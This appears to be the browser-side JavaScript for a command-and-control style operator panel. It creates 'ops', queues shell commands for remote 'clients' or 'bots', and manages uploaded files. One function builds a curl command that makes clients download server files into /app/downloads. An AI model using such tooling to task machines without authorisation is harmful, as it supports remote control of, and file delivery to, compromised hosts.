var current_op = null;

var api_url = `${window.location.protocol}//${window.location.hostname}:8080`;

function fetch_all_ops() {
    // Fetch all known ops and put them in the select option list.
    var select_tag = document.getElementById('ops-select');
    select_tag.innerHTML = `<option value='Choose an op'>Choose an op</option>`;
    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        var all_ops = this.response['data']['ops'];
        for (var i=0; i < all_ops.length; i++) {
            var new_option = document.createElement('option');
            new_option.text = all_ops[i];
            select_tag.add(new_option);
        }
    });
    req.open('GET', `${api_url}/op`);
    req.send();
}

function change_op(op_name) {
    current_op = op_name;
    console.log(`Loading new op: ${current_op}.`);
    display_commands();
}

function detect_op_choice() {
    var select_tag = document.getElementById('ops-select');
    select_tag.addEventListener('change', function () {
        var op_choice = select_tag.value;
        console.log(op_choice);
        if (op_choice != 'Choose an op') {
            change_op(op_choice);
        }
    });
}

function detect_new_op_click() {
    var new_tag = document.getElementById('new-nav');
    new_tag.addEventListener('click', function () {
        var new_op_name = prompt('Create a new op', '');
        if (new_op_name == null || new_op_name == '') {
            return;
        }
        
        var json_data = JSON.stringify({'op_name': new_op_name});

        var req = new XMLHttpRequest();
        req.responseType = 'json';
        
        req.addEventListener('load', function () {
            console.log(this.response);
            fetch_all_ops();
        });
        req.open('POST',`${api_url}/op/create`);
        req.send(json_data);
    });
}

function detect_create_command_click() {
    document.getElementById('command-create').addEventListener('click', function () {
        var command = document.getElementById('command-input').value;
        var confirmation = confirm(`Command to execute: ${command}`);
        if (!confirmation) {
            return;
        }
        console.log(command);
        var command_type = document.getElementById('command-type-choice').value;
        var req = new XMLHttpRequest();
        req.responseType = 'json';

        var json_data = JSON.stringify(
        {
            'cmd_type': command_type,
            'cmd_data': command,
            'op_name': current_op,

        });

        req.addEventListener('load', function () {
            fetch_latest_command();
        });
        req.open('POST', `${api_url}/post`);
        req.send(json_data);
    });
}

function fetch_latest_command() {
    if (!current_op) {
        return;
    }
    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        var latest_command_guid = this.response['data']['guid'];
        console.log('Latest command: ' + latest_command_guid);
        var req2 = new XMLHttpRequest();
        req2.responseType = 'json';
        
        req2.addEventListener('load', function () {
            var latest_command_type = this.response['data']['type'];
            var latest_command_content = this.response['data']['cmd'];

            var new_command_item = document.createElement('div');
            new_command_item.innerText = `Latest Command (${latest_command_type}): ${latest_command_content}`;
            document.getElementById('command-list').innerHTML = '';
            document.getElementById('command-list').appendChild(new_command_item);
        });
        req2.open('GET', `${api_url}/cmd/${latest_command_guid}`);
        req2.send();
        
    });
    req.open('GET', `${api_url}/op/fetch/${current_op}`);
    req.send();
}

function detect_delete_op_click() {
    
}

function display_commands() {
    if (!current_op) {
        return;
    }
    console.log(`Displaying commands for op ${current_op}`);
    // Clear previous contents
    document.getElementById('command-list').innerHTML = '';

    display_specific_content('command-content');
    fetch_latest_command();
}


function display_files() {
    if (!current_op) {
        return;
    }
    console.log(`Displaying files for op ${current_op}`);
    display_specific_content('files-content');

    var files_content_div = document.getElementById('files-list');
    files_content_div.innerHTML = '';
    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        var all_files = this.response['data']['files'];
        for (var i=0; i < all_files.length; i++) {
            if (all_files[i]['op_name'] == current_op) {
                var file_container = document.createElement('div');
                file_container.className = 'file-container';
                var file_name = document.createElement('a');
                file_name.innerText = all_files[i]['filename'];
                file_name.className = 'file-name';
                file_name.href = `${api_url}/files/download/${all_files[i]['guid']}`;
                file_name.setAttribute('download', all_files[i]['filename']);

                var file_delete_link = document.createElement('div');
                file_delete_link.className = 'file-delete-button';
                file_delete_link.setAttribute('guid', all_files[i]['guid']);
                file_delete_link.innerText = 'Delete';
                file_delete_link.addEventListener('click', send_file_delete_request);

                var send_to_bots_link = document.createElement('div');
                send_to_bots_link.className = 'file-send-button';
                send_to_bots_link.setAttribute('guid', all_files[i]['guid']);
                send_to_bots_link.setAttribute('filename', all_files[i]['filename']);
                send_to_bots_link.innerText = 'Send to clients';
                send_to_bots_link.addEventListener('click', send_to_clients_request);

                file_container.appendChild(file_name);
                file_container.appendChild(file_delete_link);
                file_container.appendChild(send_to_bots_link);
                files_content_div.appendChild(file_container);
            }
        }
    });
    req.open('GET', `${api_url}/files`);
    req.send();
}

function send_to_clients_request() {
    // Information needed to downloading/saving file
    var guid_to_send = this.getAttribute('guid');
    var filename = this.getAttribute('filename');

    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        console.log('Command sent.');
    });
    req.open('POST', `${api_url}/post`);

    var data = {
        'cmd_type': 'shell',
        'cmd_data': `curl ${api_url}/files/${guid_to_send} > "/app/downloads/${filename}"`,
        'op_name': current_op,
    }
    req.send(JSON.stringify(data));
}

function send_file_delete_request() {
    var guid_to_delete = this.getAttribute('guid');
    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        console.log('File deleted.');
        display_files();
    });
    req.open('POST', `${api_url}/files/delete`);

    var data = {
        'file': guid_to_delete,
    }
    req.send(JSON.stringify(data));
}

function hide_all_content() {
    return new Promise((resolve, reject) => {
        document.getElementById('command-content').style.display = 'none';
        document.getElementById('files-content').style.display = 'none';
        resolve();
    });
}

function display_specific_content(content) {
    hide_all_content()
    .then(() => {
        document.getElementById(content).style.display = 'initial';
    })
    .catch((err) => {
        console.log(err);
    });
}

function bind_command_nav() {
    document.getElementById('commands-nav').addEventListener('click', display_commands);
}

function bind_files_nav() {
    document.getElementById('files-nav').addEventListener('click', display_files);
}

function bind_upload_button() {
    var upload_button = document.getElementById('file-upload-button');
    upload_button.addEventListener('click', function() {
        var file_input = document.getElementById('file-upload');
        if (!file_input.files[0]) {
            return;
        }
        var form_data = new FormData();
        form_data.append('file', file_input.files[0]);
        form_data.append('op_name', current_op);
        
        
        var req = new XMLHttpRequest();
        req.responseType = 'json';
        
        req.addEventListener('load', function () {
            console.log('File uploaded.');
            display_files();
            file_input.value = null;
        });
        req.open('POST', `${api_url}/files/upload`);
        req.send(form_data);
    });
}

function init() {
    fetch_all_ops();
    detect_op_choice();
    detect_new_op_click();
    detect_create_command_click();
    hide_all_content();
    bind_command_nav();
    bind_files_nav();
    bind_upload_button();
}

window.onload = init;
